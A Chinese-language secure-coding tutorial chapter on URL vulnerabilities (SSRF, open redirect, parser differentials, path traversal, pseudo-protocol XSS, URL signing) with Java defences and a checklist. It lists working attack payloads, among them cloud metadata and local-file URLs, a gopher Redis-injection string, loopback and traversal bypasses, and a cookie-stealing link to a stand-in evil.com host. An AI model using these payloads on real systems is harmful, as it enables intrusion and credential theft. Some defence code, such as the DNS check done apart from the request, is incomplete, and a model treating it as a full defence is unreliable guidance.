# 06 - URL 安全与常见漏洞防护

> URL 是最被低估的攻击面——SSRF 打穿内网、开放重定向钓鱼、解析器差异绕过 WAF、路径穿越读任意文件、`javascript:` 伪协议 XSS。本章从攻击原理到防御代码，覆盖 6 大类 URL 安全漏洞

---

## 📚 目录

1. [URL 安全威胁全景图](#1-url-安全威胁全景图)
2. [SSRF 服务端请求伪造](#2-ssrf-服务端请求伪造)
3. [开放重定向 Open Redirect](#3-开放重定向-open-redirect)
4. [URL 解析器差异攻击](#4-url-解析器差异攻击)
5. [路径穿越 Path Traversal](#5-路径穿越-path-traversal)
6. [XSS 与伪协议注入](#6-xss-与伪协议注入)
7. [URL 签名与防篡改](#7-url-签名与防篡改)
8. [敏感信息泄露](#8-敏感信息泄露)
9. [防御清单 CheckList](#9-防御清单-checklist)

---

## 1. URL 安全威胁全景图

```text
用户输入 URL
    │
    ├─ 服务端请求该 URL ────────────► SSRF（打内网/读元数据/端口扫描）
    ├─ 服务端跳转到该 URL ──────────► 开放重定向（钓鱼）
    ├─ 服务端解析该 URL 后过滤 ─────► 解析器差异绕过（WAF/防火墙）
    ├─ URL 中的 path 用于读文件 ────► 路径穿越
    ├─ URL 嵌入页面 ───────────────► XSS（javascript:/data: 伪协议）
    ├─ URL 中的敏感数据 ───────────► 日志/Referer 泄露
    └─ URL 被篡改/重放 ────────────► 越权/参数篡改
```

| 漏洞 | 危害等级 | 常见场景 | 一句话防御 |
|------|:---:|---------|-----------|
| SSRF | 🔴 严重 | 网页截图、URL 抓取、Webhook、文件代理 | Scheme + Host + IP 白名单 |
| 开放重定向 | 🟠 高 | OAuth `redirect_uri`、登录后跳转、统一登出 | 白名单域名 + 相对路径 |
| 解析器差异 | 🟠 高 | WAF / Nginx 过滤后 Java 解析执行 | 统一解析器 + 输入规范化 |
| 路径穿越 | 🔴 严重 | 文件下载 `?path=`、静态资源 `..` | 拒绝 `..` + 限制根目录 |
| URL 伪协议 XSS | 🟡 中 | UGC 内容中的 `<a href>` 、分享链接 | 白名单 `http`/`https` |
| 敏感信息泄露 | 🟡 中 | Token 放 Query、Referer 带到第三方 | Token 放 Header/Body |

---

## 2. SSRF 服务端请求伪造

### 2.1 攻击原理

```text
用户输入：https://evil.com/steal
    → 后端请求该 URL
    → 发起 GET https://evil.com/steal

攻击者输入：http://169.254.169.254/latest/meta-data/
    → 后端请求该 URL
    → 🔴 读取到云服务器元数据（AWS / 阿里云 / 腾讯云等）
```

### 2.2 经典攻击载荷

```text
# ① 云元数据服务（各云厂商的 IMDS）
http://169.254.169.254/latest/meta-data/                          # AWS
http://169.254.169.254/latest/user-data/                          # AWS（可能含密钥）
http://100.100.100.200/latest/meta-data/                          # 阿里云
http://metadata.tencentyun.com/latest/meta-data/                  # 腾讯云
http://169.254.169.254/metadata/instance?api-version=2021-02-01   # Azure

# ② 内网服务探测
http://127.0.0.1:6379/              # Redis
http://127.0.0.1:3306/              # MySQL
http://127.0.0.1:9200/              # Elasticsearch
http://127.0.0.1:8080/actuator/env  # Spring Boot Actuator
http://127.0.0.1:9090/              # Prometheus

# ③ 利用特殊协议读取本地文件
file:///etc/passwd
file:///proc/self/environ           # 环境变量 → 可能含密码

# ④ 利用 gopher 协议构造任意 TCP 包打 Redis
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$4%0d%0akey%0d%0a$5%0d%0avalue%0d%0a
# ↑ 往 6379 写 Redis 命令

# ⑤ DNS Rebinding（绕过 Host 检查）
# 攻击者域名第一次解析到合法 IP，TTL 设为 0，第二次解析到 127.0.0.1
```

### 2.3 防御方案（分层）

**第一层：Scheme 白名单**

```java
private static final Set<String> ALLOWED_SCHEMES = Set.of("http", "https");

public void validateUrl(String rawUrl) {
    URI uri = URI.create(rawUrl);
    String scheme = uri.getScheme();
    if (scheme == null || !ALLOWED_SCHEMES.contains(scheme.toLowerCase())) {
        throw new SecurityException("Forbidden scheme: " + scheme);
    }
}
```

**第二层：DNS 解析 + IP 黑名单**

```java
import java.net.InetAddress;
import java.net.URI;

public boolean isInternalIp(URI uri) throws Exception {
    InetAddress addr = InetAddress.getByName(uri.getHost());
    byte[] octets = addr.getAddress();

    // IPv4 检查
    if (octets.length == 4) {
        int first = octets[0] & 0xFF;
        int second = octets[1] & 0xFF;

        // 回环地址 127.0.0.0/8
        if (first == 127) return true;
        // 链路本地 169.254.0.0/16（含云元数据）
        if (first == 169 && second == 254) return true;
        // A 类私有 10.0.0.0/8
        if (first == 10) return true;
        // B 类私有 172.16.0.0/12
        if (first == 172 && second >= 16 && second <= 31) return true;
        // C 类私有 192.168.0.0/16
        if (first == 192 && second == 168) return true;
        // 0.0.0.0/8
        if (first == 0) return true;
    }

    // IPv6 回环
    if (addr.isLoopbackAddress()) return true;
    if (addr.isLinkLocalAddress()) return true;
    if (addr.isSiteLocalAddress()) return true;

    return false;
}
```

**第三层：禁止重定向跟随到内网（最关键）**

```java
// ⚠️ 很多 SSRF 漏洞不在初始 URL，而在 30X 重定向链中
// 攻击者：https://evil.com/redirect → 302 → http://169.254.169.254/

// ✅ 使用自定义 RedirectHandler，每步都检查
HttpClient client = HttpClient.newBuilder()
    .followRedirects(Redirect.NORMAL)  // ❌ 默认跟着走
    .build();

// ✅ 手动控制重定向
HttpClient client = HttpClient.newBuilder()
    .followRedirects(Redirect.NEVER)   // 关掉自动跟随
    .build();

HttpResponse<Void> resp = client.send(request, BodyHandlers.discarding());
if (isRedirect(resp.statusCode())) {
    String location = resp.headers().firstValue("Location").orElse("");
    validateUrl(location);             // 对目标也做完整校验
    // ... 发新请求前再次校验 DNS 解析结果
}
```

**第四层：禁用危险协议处理器**

```java
// JVM 层面禁用 file: / netdoc: / jar: 等非 HTTP 协议
// 方式一：SecurityManager（Java 17 前）
// 方式二：自定义 URLStreamHandlerFactory

// 方式三：限制 HttpClient 只处理 http/https
// JDK HttpClient 默认就只支持 http/https，不需要额外配置

// ⚠️ 如果用 URL.openConnection() 需要小心
// URL.openConnection() 会加载对应协议的 URLStreamHandler
// new URL("file:///etc/passwd").openConnection() → 读取本地文件
```

### 2.4 完整 SSRF 防御示例

```java
@Component
public class SafeUrlFetcher {

    private static final Set<String> ALLOWED_SCHEMES = Set.of("http", "https");
    private static final int MAX_REDIRECTS = 3;

    private final HttpClient client = HttpClient.newBuilder()
            .followRedirects(HttpClient.Redirect.NEVER)
            .connectTimeout(Duration.ofSeconds(3))
            .build();

    public String fetch(String rawUrl) throws SecurityException, IOException {
        URI uri = validate(rawUrl);

        HttpResponse<InputStream> resp = sendWithRedirectCheck(uri, 0);
        return new String(resp.body().readAllBytes(), StandardCharsets.UTF_8);
    }

    private URI validate(String rawUrl) {
        URI uri = URI.create(rawUrl.trim());

        // 1. Scheme 白名单
        String scheme = uri.getScheme();
        if (scheme == null || !ALLOWED_SCHEMES.contains(scheme.toLowerCase())) {
            throw new SecurityException("Disallowed scheme: " + scheme);
        }

        // 2. Host 非空
        String host = uri.getHost();
        if (host == null || host.isEmpty()) {
            throw new SecurityException("Empty host");
        }

        // 3. 防 DNS Rebinding：先解析，检查 IP，再发请求（同一次解析）
        try {
            InetAddress addr = InetAddress.getByName(host);
            if (isInternal(addr)) {
                throw new SecurityException("Internal IP: " + addr.getHostAddress());
            }
        } catch (UnknownHostException e) {
            throw new SecurityException("Cannot resolve: " + host);
        }

        return uri;
    }

    private HttpResponse<InputStream> sendWithRedirectCheck(URI uri, int depth)
            throws IOException {
        if (depth > MAX_REDIRECTS) {
            throw new SecurityException("Too many redirects");
        }

        HttpRequest request = HttpRequest.newBuilder(uri)
                .timeout(Duration.ofSeconds(5))
                .GET()
                .build();

        HttpResponse<InputStream> resp = client.send(request,
                HttpResponse.BodyHandlers.ofInputStream());

        int status = resp.statusCode();
        if (status >= 300 && status < 400) {
            String location = resp.headers().firstValue("Location")
                    .orElseThrow(() -> new SecurityException("Redirect without Location"));
            URI redirectUri = uri.resolve(URI.create(location));
            validate(redirectUri.toASCIIString());   // 递归校验目标
            return sendWithRedirectCheck(redirectUri, depth + 1);
        }

        return resp;
    }

    private boolean isInternal(InetAddress addr) {
        if (addr.isLoopbackAddress() || addr.isLinkLocalAddress()
                || addr.isSiteLocalAddress()) return true;
        byte[] b = addr.getAddress();
        if (b.length == 4) {
            int a = b[0] & 0xFF, c = b[1] & 0xFF;
            return a == 0 || a == 10 || a == 127
                || (a == 169 && c == 254)
                || (a == 172 && c >= 16 && c <= 31)
                || (a == 192 && c == 168);
        }
        return false;
    }
}
```

---

## 3. 开放重定向 Open Redirect

### 3.1 攻击原理

```text
正常流程：https://mysite.com/login?redirect=/home
    → 登录成功 → 302 → /home    ✅

攻击流程：https://mysite.com/login?redirect=https://fiishing-site.com
    → 登录成功 → 302 → https://fiishing-site.com
    → 🔴 用户看到钓鱼登录页，域名仍然很像 mysite.com
```

### 3.2 高风险场景

| 场景 | URL 参数 | 说明 |
|------|---------|------|
| 登录后跳转 | `?redirect=` `?return_url=` `?next=` | 最常见 |
| 统一登出 | `?post_logout_redirect_uri=` | OIDC 标准参数 |
| OAuth 授权 | `?redirect_uri=` | OAuth 2.0 |
| 单点登录 | `?RelayState=` | SAML |
| 语言切换 | `?lang=` 结合跳转 | — |
| URL 缩短服务 | 短链目标地址 | — |

### 3.3 防御方案

**方案一：白名单域名（最安全）**

```java
@Component
public class RedirectValidator {

    private static final Set<String> ALLOWED_HOSTS = Set.of(
        "mysite.com",
        "www.mysite.com",
        "app.mysite.com"
    );

    public String safeRedirect(String targetUrl) {
        if (targetUrl == null || targetUrl.isBlank()) {
            return "/";   // 默认跳首页
        }

        URI uri;
        try {
            uri = URI.create(targetUrl);
        } catch (IllegalArgumentException e) {
            return "/";   // 非法 URL，忽略
        }

        // ① 无 scheme → 相对路径，直接放行
        if (uri.getScheme() == null) {
            // 仍需防 //evil.com 这种协议相对 URL
            if (targetUrl.startsWith("//")) return "/";
            // 仍需防 \evil.com（反斜杠绕过）
            if (targetUrl.contains("\\")) return "/";
            return targetUrl;
        }

        // ② 有 scheme → 必须是白名单域名
        String host = uri.getHost();
        if (host == null || !ALLOWED_HOSTS.contains(host.toLowerCase())) {
            return "/";
        }

        // ③ 检查反斜杠绕过
        if (targetUrl.contains("\\")) return "/";

        return targetUrl;
    }
}
```

**方案二：仅允许相对路径（适用于内部跳转）**

```java
public String validateRelativeRedirect(String target) {
    if (target == null || target.isBlank()) return "/";

    // 必须以 / 开头
    if (!target.startsWith("/")) return "/";

    // 防止 //evil.com（协议相对）
    if (target.startsWith("//")) return "/";

    // 防止反斜杠绕过
    if (target.contains("\\")) return "/";

    // URL 解码后二次检查 —— 防 /%2f/ → //evil.com
    String decoded = URLDecoder.decode(target, StandardCharsets.UTF_8);
    if (decoded.startsWith("//") || decoded.contains("\\")) return "/";

    // 路径穿越检查
    if (decoded.contains("..")) return "/";

    return target;
}
```

**方案三：OAuth `redirect_uri` 专用——精确匹配**

```java
// OAuth 的 redirect_uri 必须和注册时完全一致，不能是"子目录通配"
public boolean validateRedirectUri(String requested, String registered) {
    URI req = URI.create(requested);
    URI reg = URI.create(registered);

    // Scheme + Host + Port 完全相同
    if (!req.getScheme().equalsIgnoreCase(reg.getScheme())) return false;
    if (!req.getHost().equalsIgnoreCase(reg.getHost())) return false;
    if (req.getPort() != reg.getPort()) return false;

    // Path 必须精确匹配或是注册值的子路径（取决于安全策略）
    String reqPath = req.getRawPath() != null ? req.getRawPath() : "/";
    String regPath = reg.getRawPath() != null ? reg.getRawPath() : "/";
    return reqPath.equals(regPath) || reqPath.startsWith(regPath + "/");

    // Fragment / Query 参数差异不阻止（OAuth 规范允许）
}
```

---

## 4. URL 解析器差异攻击

### 4.1 攻击原理

不同解析器对同一字符串解析结果不同 → 过滤用 A 解析，执行用 B 解析 → 绕过。

```text
攻击字符串：https://evil.com#@safe.com/path

Java URI.create()：
  host = "evil.com"           ← 过滤层（Java）认为 host 是 evil.com，拒绝 ✅

浏览器 new URL()：
  host = "safe.com"           ← 执行层（浏览器）看到的是 safe.com

但如果反过来配置——浏览器端过滤、后端发请求：
攻击字符串：https://evil.com\@safe.com/path

浏览器：
  host = "evil.com"           ← 浏览器把 \@ 当路径分隔，认为 host 是 evil.com
                              ← 但浏览器过滤认为需要跳到 evil.com？不，这取决于过滤器

实际 HTTP 请求库（如 curl）：
  host = "safe.com"           ← \@ 被忽略，@ 后才是 host
```

### 4.2 经典差异一览

| 输入 | Java `URI.create()` | WHATWG `new URL()` | curl / Python |
|------|-------------------|-------------------|---------------|
| `https://a.com\@b.com` | 抛异常 | host=`b.com` | host=`b.com` |
| `https://a.com#@b.com` | host=`a.com` | host=`a.com` | host=`a.com` |
| `https://a b.com/` | 抛异常 | `https://a%20b.com/` | 抛异常/编码 |
| `https://a.com:443@b.com` | host=`b.com` | host=`b.com` | host=`b.com` |
| `https://0x7f000001/` | host=`0x7f000001` | host=`127.0.0.1` ⚠️ | host=`127.0.0.1` ⚠️ |
| `https://2130706433/` | host=`2130706433` | host=`127.0.0.1` ⚠️ | host=`127.0.0.1` ⚠️ |
| `https://0/` | host=`0` | host=`0.0.0.0` ⚠️ | host=`0.0.0.0` ⚠️ |

### 4.3 DNS 层面的绕过

```text
# 各种等价于 127.0.0.1 的写法
http://127.0.0.1/
http://0x7f.0.0.1/            # 十六进制 → 127.0.0.1
http://0177.0.0.1/            # 八进制 → 127.0.0.1
http://2130706433/             # 十进制整数 → 127.0.0.1
http://0x7f000001/             # 十六进制整数
http://127.0.0.1.nip.io/      # nip.io 泛域名 → 127.0.0.1
http://localhost/
http://[::1]/                 # IPv6 回环
http://[0:0:0:0:0:0:0:1]/    # IPv6 完整写法
http://[::ffff:127.0.0.1]/   # IPv4-mapped IPv6
http://spoofed.burpcollaborator.net  # DNS Rebinding
```

### 4.4 防御：IP 层再做一层校验

```java
public boolean isInternalAfterResolution(String host) throws Exception {
    InetAddress addr = InetAddress.getByName(host);
    return isInternal(addr);
}

// ⚠️ 不能只做字符串黑名单（如 contains("127.0.0.1")）
// 必须真正解析 DNS，拿到 InetAddress 后判断
// 0x7f000001 的字符串不含 "127.0.0.1"，但解析后就是 127.0.0.1
```

> 🎯 **核心防御原则**：**过滤在语法层做（Scheme 白名单），校验在 IP 层做（DNS 解析后检查）。永远不要依赖字符串匹配来防御 SSRF。**

---

## 5. 路径穿越 Path Traversal

### 5.1 攻击原理

```text
正常：GET /download?file=report.pdf
    → 读 /var/files/report.pdf

攻击：GET /download?file=../../etc/passwd
    → 读 /var/files/../../etc/passwd → /etc/passwd 🔴

编码绕过：GET /download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
    → URL 解码 → ../../etc/passwd

双重编码：GET /download?file=%252e%252e%252f
    → 第一次解码 → %2e%2e%2f → 第二次解码 → ../
```

### 5.2 经典绕过手法

| 手法 | 载荷 | 说明 |
|------|------|------|
| 基本 | `../../etc/passwd` | 直接穿越 |
| 绝对路径 | `/etc/passwd` | 绕过前缀拼接 |
| URL 编码 | `%2e%2e%2f` | `../` 的编码 |
| 双重编码 | `%252e%252e%252f` | `%` → `%25` |
| Unicode | `..%c0%af`、`..%ef%bc%8f` | 宽字节绕过 |
| Null 字节 | `../../etc/passwd%00.jpg` | 截断后缀（老版本） |
| 反斜杠 | `..\\..\\windows\\system32` | Windows 路径分隔符 |
| 长路径 | `....//....//etc/passwd` | 删除 `../` 后变 `../../etc/passwd` |

### 5.3 防御方案

```java
@Component
public class SafeFileAccessor {

    private final Path baseDir;

    public SafeFileAccessor(@Value("${app.file.base-dir}") String baseDir) {
        // ✅ 第一步：获取规范化的实际路径（解析符号链接）
        this.baseDir = Paths.get(baseDir).toRealPath().normalize();
    }

    public Path resolveSafe(String userInput) {
        // ② 拒绝空值
        if (userInput == null || userInput.isBlank()) {
            throw new SecurityException("Empty path");
        }

        // ③ URL 解码后进行二次检查（但不要完全信任解码结果）
        String decoded;
        try {
            decoded = URLDecoder.decode(userInput, StandardCharsets.UTF_8);
        } catch (Exception e) {
            throw new SecurityException("Decode error");
        }

        // ④ 拒绝危险字符（在解码后检查）
        if (decoded.contains("..")) {
            throw new SecurityException("Path traversal detected");
        }

        // ⑤ 拒绝特殊前缀
        if (decoded.startsWith("/") || decoded.startsWith("\\")) {
            throw new SecurityException("Absolute path not allowed");
        }

        // ⑥ 拼接 + 规范化
        Path resolved = baseDir.resolve(decoded).normalize();

        // ⑦ toRealPath + 检查是否在 baseDir 内（最终防线）
        try {
            Path realPath = resolved.toRealPath();  // FOLLOW_LINKS 默认行为
            if (!realPath.startsWith(baseDir)) {
                throw new SecurityException("Path escapes base directory");
            }
            return realPath;
        } catch (NoSuchFileException e) {
            // 文件不存在时可以返回规范化路径（允许写新文件）
            if (!resolved.normalize().startsWith(baseDir.normalize())) {
                throw new SecurityException("Path escapes base directory");
            }
            return resolved.normalize();
        }
    }
}
```

```java
// 使用示例
@GetMapping("/files/{*path}")
public ResponseEntity<Resource> download(@PathVariable String path) {
    Path file = safeFileAccessor.resolveSafe(path);
    Resource resource = new FileSystemResource(file);
    return ResponseEntity.ok()
            .contentType(MediaType.APPLICATION_OCTET_STREAM)
            .body(resource);
}
```

---

## 6. XSS 与伪协议注入

### 6.1 `javascript:` 伪协议攻击

```html
<!-- 用户输入 URL 作为链接时 -->
<a href="javascript:fetch('https://evil.com?c='+document.cookie)">点击领取</a>

<!-- 编码绕过 -->
<a href="&#106;avascript:alert(1)">Click</a>     <!-- HTML 实体编码 -->
<a href="javascript:alert(1)">Click</a>      <!-- Unicode 转义 -->

<!-- 大小写绕过 -->
<a href="JaVaScRiPt:alert(1)">Click</a>
```

**防御**：

```java
// 用户可控 URL 在页面中渲染为链接时，Scheme 必须白名单
public String sanitizeUrl(String rawUrl) {
    URI uri;
    try {
        uri = URI.create(rawUrl.trim());
    } catch (Exception e) {
        return "";   // 非法 URL 返回空或 #
    }

    String scheme = uri.getScheme();
    if (scheme == null) {
        // 相对路径：允许 http 开头的相对路径（已去除 scheme）
        // 但禁止 //evil.com 协议相对
        if (rawUrl.startsWith("//")) return "";
        return rawUrl;
    }

    return switch (scheme.toLowerCase()) {
        case "http", "https" -> rawUrl;
        case "mailto", "tel" -> rawUrl;     // 安全白名单
        default -> "";                       // 拒绝 javascript: data: vbscript: 等
    };
}
```

```html
<!-- 前端双重保障 -->
<a [href]="sanitizeUrl(userUrl)"
   target="_blank"
   rel="noopener noreferrer">用户链接</a>
<!-- rel="noopener" 防止 window.opener 反向操作原页面 -->
```

### 6.2 `data:` 伪协议

```html
<!-- data:text/html 可执行脚本 -->
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>

<!-- 防御：禁止顶层导航到 data: URL（现代浏览器已内置阻止） -->
<!-- 但 <embed> <iframe> <object> 仍需 CSP 防御 -->
```

```nginx
# CSP 头限制
Content-Security-Policy: default-src 'self'; frame-src 'self' https:;
```

---

## 7. URL 签名与防篡改

### 7.1 场景

```text
# 邮件验证链接
https://mysite.com/verify?email=tom@example.com&expires=1700000000

# 问题：攻击者把 email 改成 victim@example.com → 验证他人邮箱

# 解决：加签名字段
https://mysite.com/verify?email=tom@example.com&expires=1700000000&sig=xxxxx
```

### 7.2 签名生成与验证

```java
@Component
public class UrlSigner {

    private final Mac hmac;

    public UrlSigner(@Value("${app.url-sign-secret}") String secret) throws Exception {
        this.hmac = Mac.getInstance("HmacSHA256");
        this.hmac.init(new SecretKeySpec(secret.getBytes(StandardCharsets.UTF_8), "HmacSHA256"));
    }

    /** 为 URL 加上签名参数 */
    public String sign(String urlWithoutSig) {
        // ① 去掉已有的 sig 参数
        URI uri = URI.create(urlWithoutSig);
        String query = uri.getRawQuery();
        if (query == null) query = "";

        // ② 对 query 排序（排除 sig），拼接成签名串
        String canonicalQuery = normalizeQuery(query);

        // ③ 拼接签名原始串
        String signingString = uri.getRawPath() + "?" + canonicalQuery;

        // ④ HMAC + Base64URL
        byte[] sig = hmac.doFinal(signingString.getBytes(StandardCharsets.UTF_8));
        String sigB64 = Base64.getUrlEncoder().withoutPadding().encodeToString(sig);

        // ⑤ 拼回 URL
        String sep = query.isEmpty() ? "" : "&";
        return urlWithoutSig + sep + "sig=" + sigB64;
    }

    /** 验证签名 */
    public boolean verify(String signedUrl) {
        URI uri = URI.create(signedUrl);
        String query = uri.getRawQuery();
        if (query == null) return false;

        // 提取 sig 参数
        Map<String, String> params = parseQuery(query);
        String providedSig = params.remove("sig");
        if (providedSig == null) return false;

        // 重构签名串（不含 sig）
        String canonical = params.entrySet().stream()
                .sorted(Map.Entry.comparingByKey())
                .map(e -> e.getKey() + "=" + e.getValue())
                .collect(Collectors.joining("&"));
        String signingString = uri.getRawPath() + "?" + canonical;

        // 计算期望签名
        byte[] expected = hmac.doFinal(signingString.getBytes(StandardCharsets.UTF_8));
        byte[] provided = Base64.getUrlDecoder().decode(providedSig);

        return MessageDigest.isEqual(expected, provided);  // 常量时间比较
    }

    private String normalizeQuery(String query) {
        return Arrays.stream(query.split("&"))
                .filter(kv -> !kv.startsWith("sig="))
                .filter(kv -> !kv.isEmpty())
                .sorted()
                .collect(Collectors.joining("&"));
    }

    private Map<String, String> parseQuery(String query) {
        return Arrays.stream(query.split("&"))
                .map(kv -> kv.split("=", 2))
                .filter(a -> a.length == 2)
                .collect(Collectors.toMap(a -> a[0], a -> a[1], (v1, v2) -> v1));
    }
}
```

### 7.3 签名安全要点

| 要点 | 说明 |
|------|------|
| **排序 query 参数** | 保证签名串唯一性，不受参数顺序影响 |
| **排除 sig 本身** | 鸡生蛋问题 |
| **包含过期时间** | `&expires=1700000000`，防止签名 URL 被长期滥用 |
| **常量时间比较** | `MessageDigest.isEqual()`，防止时序攻击 |
| **HMAC-SHA256 + Base64URL** | JWT 同款，不放 `+/=` 在 URL 里 |
| **不要签 Fragment** | Fragment 不发给服务端 |
| **签名前先归一化** | 保证同一资源的不同表示（大小写、编码）→ 同一签名 |

---

## 8. 敏感信息泄露

### 8.1 Token 放 URL 的五种泄露路径

```text
https://mysite.com/api/doc/42?token=abc123xyz

泄露路径：
1. 浏览器地址栏 → 截图 / 屏幕共享 / 身后路人
2. 浏览器历史记录 → 其他人用同一台电脑
3. 服务端 access_log → 日志系统 → ELK / Splunk 可搜索
4. Referer 头 → 页面里嵌了第三方图片/统计 → token 带到第三方
5. 复制粘贴分享 → 直接发给了别人
```

### 8.2 必须放 URL 时的缓解措施

| 场景 | 缓解 | 说明 |
|------|------|------|
| 邮件验证链接 | ✅ 一次性 + 短有效期 | 用完即失效 |
| 密码重置链接 | ✅ 一次性 + 短有效期 + 需交互 | 点击后需要重输密码 |
| WebSocket 鉴权 | ⚠️ 放 Query 是不得已 | 首帧发鉴权消息代替 |
| 文件临时下载 | ✅ 签名 URL + 短有效期 | 1h 过期 |
| 分享链接 | ✅ 不透明 token（如分享码） | 非 JWT，不可解码 |

```java
// ❌ 错误：把 JWT 放 URL 上
String url = "https://mysite.com/share?jwt=" + fullJwt;
// JWT 可解码出用户 ID、角色等信息

// ✅ 正确：用一个随机不透明 token 映射到后台权限
String shareCode = randomAlphanumeric(12);
redis.setex("share:" + shareCode, 3600, documentId);
String url = "https://mysite.com/s/" + shareCode;
```

---

## 9. 防御清单 CheckList

### 9.1 代码审查 Checklist

```text
□ 所有接受用户 URL 的功能点是否做了 Scheme 白名单（只允许 http/https）？
□ 所有服务端发 HTTP 请求的地方是否阻止了内网 IP？
□ 所有服务端发 HTTP 请求的地方是否手动控制了重定向跟随？
□ 所有重定向/跳转是否限制在相对路径或白名单域名？
□ 所有文件路径拼接是否做了路径穿越防护（.. 拒绝 + 限定根目录）？
□ 所有用户链接在页面渲染时是否限制了 Scheme？
□ 所有对外链接是否加了 rel="noopener noreferrer"？
□ 下载/代理接口是否检查了 Content-Type 和文件大小？
□ 签名 URL 是否包含了过期时间？
□ Token/Key 是否放在了 Header 而非 URL？
□ 是否在使用 getRawPath() 做安全判断？
□ WAF/网关的 URL 过滤是否考虑了编码绕过和解析器差异？
```

### 9.2 分层防御体系

```text
                    ┌──────────────────────────┐
                    │      客户端（浏览器）      │
                    │  CSP + X-Frame-Options    │
                    │  rel="noopener"           │
                    │  <a> scheme 检查          │
                    └──────────┬───────────────┘
                               │
                    ┌──────────▼───────────────┐
                    │      WAF / CDN            │
                    │  URL 解码后检查           │
                    │  请求方法 / 频率限制       │
                    └──────────┬───────────────┘
                               │
                    ┌──────────▼───────────────┐
                    │       Nginx / 网关        │
                    │  $request_uri 安全过滤    │
                    │  proxy_read_timeout       │
                    │  large_client_header_...  │
                    └──────────┬───────────────┘
                               │
                    ┌──────────▼───────────────┐
                    │      Spring 应用层        │
                    │  Scheme 白名单            │
                    │  IP 黑名单（DNS 解析后）   │
                    │  重定向域名白名单          │
                    │  路径穿越防护             │
                    │  URL 签名验证              │
                    └──────────────────────────┘
```

---

> 🎯 **本篇核心要点**
> 1. SSRF 防御分四层：Scheme 白名单 → DNS 解析 + IP 判断 → 禁止重定向跟随到内网 → 禁用危险协议
> 2. **DNS 解析后再判断 IP**，不要做字符串匹配——`0x7f000001` 不含 `127.0.0.1` 但解析后就是它
> 3. 开放重定向的防御：允许相对路径（注意防 `//evil.com`），有 scheme 时必须白名单域名
> 4. 路径穿越：拒绝 `..` → URL 解码后二次检查 → `normalize()` → `toRealPath()` → `startsWith(baseDir)`
> 5. URL 签名必须：排序参数 + 排除签名本身 + 包含过期时间 + 常量时间比较
> 6. **敏感信息永远不放 URL**；必须放时用一次性短效签名

---

**上一模块**：[05-URL解析编程实战-Java与JS.md](05-URL解析编程实战-Java与JS.md) / **下一模块**：[07-短链系统设计与URL工程实践.md](07-短链系统设计与URL工程实践.md)
